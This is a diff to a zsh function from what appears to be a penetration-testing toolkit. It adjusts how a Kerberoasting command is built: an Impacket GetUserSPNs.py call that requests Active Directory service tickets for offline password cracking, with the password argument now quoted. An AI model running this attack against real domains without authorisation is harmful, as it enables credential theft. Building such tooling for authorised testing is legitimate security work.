@@ -42,7 +42,7 @@ nb-ad-kerb-kerberoast() {
     __check-project
     nb-vars-set-domain
     __ask "Enter any domain user account"
-    __check-user
+    nb-vars-set-user
     __ask "Enter the IP address of the target domain controller"
     nb-vars-set-rhost
 
@@ -53,7 +53,7 @@ nb-ad-kerb-kerberoast() {
         echo
         __ask "Enter a password for authentication"
         nb-vars-set-pass
-        print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER}:${__PASS} -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
+        print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
